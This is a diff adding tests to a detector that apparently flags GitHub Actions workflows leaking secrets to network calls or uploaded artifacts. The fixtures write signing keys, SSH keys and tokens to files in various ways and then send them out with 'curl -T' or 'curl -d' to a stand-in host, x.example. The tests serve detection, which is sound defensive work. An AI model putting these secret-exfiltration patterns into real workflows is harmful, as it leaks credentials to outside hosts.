@@ -665,7 +665,7 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what a later step can reach", () => {
       "    env:",
       "      V: ${{ secrets.NPM_TOKEN }}",
       "    steps:",
-      "      - run: set -euo pipefail && echo ok > ok.txt",
+      "      - run: set -euo pipefail > ok.txt",
       "      - uses: actions/upload-artifact@v4",
       "        with:",
       "          path: ok.txt",
@@ -699,6 +699,42 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what a later step can reach", () => {
     expect(hits()).toEqual([10]);
   });
 
+  it("follows a deploy key into ssh, in the same step and across steps", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - env:",
+      "          KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "        run: |",
+      '          printf "%s" "$KEY" > key && chmod 600 key',
+      "          ssh -i key -p 2222 -o StrictHostKeyChecking=yes deploy@x.example ./deploy.sh",
+    ]);
+    expect(hits()).toEqual([7]);
+
+    workflow([
+      ...HEAD,
+      "    steps:",
+      "      - env:",
+      "          KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+      '        run: printf "%s" "$KEY" > "$RUNNER_TEMP/ssh/deploy_key"',
+      '      - run: ssh -i "$RUNNER_TEMP/ssh/deploy_key" deploy@x.example ./deploy.sh',
+    ]);
+    expect(hits()).toEqual([10]);
+  });
+
+  it("does not count ssh-keygen, ssh-keyscan or ssh to loopback as egress", () => {
+    workflow([
+      ...HEAD,
+      "    env:",
+      "      KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
+      "    steps:",
+      '      - run: ssh-keygen -R x.example -f "$HOME/.ssh/known_hosts"',
+      "      - run: ssh-keyscan -p 22 x.example",
+      "      - run: ssh -p 2222 git@127.0.0.1 true",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
   it("does not read a Windows drive path or a script named after a tool as egress", () => {
     workflow([
       ...HEAD,
@@ -710,6 +746,99 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what a later step can reach", () => {
       "      - run: rsync -a --exclude=a:b src/ dst/",
     ]);
     expect(hits()).toEqual([]);
+  });
+});
+
+describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: files followed by path", () => {
+  const secretStep = ['      - env: { T: "${{ secrets.SIGNING_KEY }}" }'];
+
+  it.each([
+    ["dd of=", 'run: printf "%s" "$T" | dd of=k.bin', "      - run: curl -T k.bin https://x.example/u"],
+    ["openssl -out", 'run: printf "%s" "$T" | openssl enc -aes-256-cbc -pass pass:x -out k.enc', "      - run: curl -T k.enc https://x.example/u"],
+    ["pathlib", `run: python3 -c "import os, pathlib; pathlib.Path('k.txt').write_text(os.environ['T'])"`, "      - run: curl -T k.txt https://x.example/u"],
+    ["clobber redirect", 'run: echo "$T" >| k.txt', "      - run: curl -T k.txt https://x.example/u"],
+    ["variable indirection", 'run: X=$T; echo "$X" > k.txt', "      - run: curl -d @k.txt https://x.example/u"],
+    ["tar of the directory", 'run: echo "$T" > k.txt', "      - run: tar czf a.tgz . && curl -T a.tgz https://x.example/u"],
+    ["zip of the directory", 'run: echo "$T" > k.txt', "      - run: zip -r a.zip . && curl -T a.zip https://x.example/u"],
+    ["a matching glob", 'run: echo "$T" > k.txt', '      - run: curl -T "*.txt" https://x.example/u'],
+  ])("follows a secret written with %s", (_label, write, send) => {
+    workflow([...HEAD, "    steps:", ...secretStep, `        ${write}`, send]);
+    expect(hits()).toEqual([9]);
+  });
+
+  // After a $GITHUB_ENV export the whole step holds the secret, and only its
+  // explicit file writes are followed, so each write form must be parsed.
+  it.each([
+    ["tee", "printf x | tee out.txt"],
+    ["a lowercase PowerShell cmdlet", '"x" | out-file out.txt'],
+    ["Python open for writing", `python3 -c "open('out.txt', 'w').write('x')"`],
+  ])("follows %s in a step after a $GITHUB_ENV export", (_label, write) => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      ...secretStep,
+      '        run: echo "TOKEN=$T" >> "$GITHUB_ENV"',
+      `      - run: ${write}`,
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: out.txt",
+    ]);
+    expect(hits()).toEqual([10]);
+  });
+
+  it("keeps a heredoc body with the command that reads it", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      ...secretStep,
+      "        run: |",
+      "          base64 > k.b64 <<EOF",
+      "          $T",
+      "          EOF",
+      "      - run: curl -T k.b64 https://x.example/u",
+    ]);
+    expect(hits()).toEqual([12]);
+  });
+
+  it("taints only what the command reading the file produces, not the rest of its step", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      ...secretStep,
+      '        run: echo "$T" > secret.txt',
+      "      - run: |",
+      "          cat secret.txt > /dev/null",
+      "          gcc -o app.exe main.c",
+      "          cp README.md release/README.md",
+      "      - run: curl -T release/README.md https://x.example/u",
+    ]);
+    expect(hits()).toEqual([]);
+  });
+
+  it("reaches an upload only when its path covers the tainted file", () => {
+    workflow([
+      ...HEAD,
+      "    steps:",
+      ...secretStep,
+      '        run: mkdir -p logs/dist && echo "$T" > logs/dist/debug.txt',
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: dist/",
+    ]);
+    expect(hits()).toEqual([]);
+
+    workflow([
+      ...HEAD,
+      "    steps:",
+      ...secretStep,
+      '        run: mkdir -p dist && echo "$T" > dist/notes.txt',
+      "      - uses: actions/upload-artifact@v4",
+      "        with:",
+      "          path: |",
+      "            dist/",
+      "            !dist/*.map",
+    ]);
+    expect(hits()).toEqual([9]);
   });
 });
 
@@ -753,6 +882,25 @@ describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
     expect(
       timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: curl -H ${quotes}`]),
     ).toBeLessThan(performanceBudget(15_000));
+  });
+
+  it("floods of globs against many tainted files", { timeout: performanceBudget(60_000) }, () => {
+    const tainted = [
+      '      - env: { T: "${{ secrets.X }}" }',
+      "        run: |",
+      ...Array.from({ length: 250 }, (_, i) => `          echo "$T" > d${i}/k${i}.txt`),
+    ];
+    const repeated = "*.x ".repeat(Math.ceil(FIVE_MIB / 4));
+    expect(timed([...HEAD, "    steps:", ...tainted, `      - run: curl -T ${repeated}`])).toBeLessThan(
+      performanceBudget(15_000),
+    );
+    // A glob repeated past the evaluation cap keeps its own answer: *.x covers no .txt.
+    expect(hits()).toEqual([]);
+    let distinct = "";
+    for (let i = 0; distinct.length < FIVE_MIB; i++) distinct += `*.x${i} `;
+    expect(timed([...HEAD, "    steps:", ...tainted, `      - run: curl -T ${distinct}`])).toBeLessThan(
+      performanceBudget(15_000),
+    );
   });
 
   it("many steps each with a secret and a loopback call", { timeout: performanceBudget(60_000) }, () => {
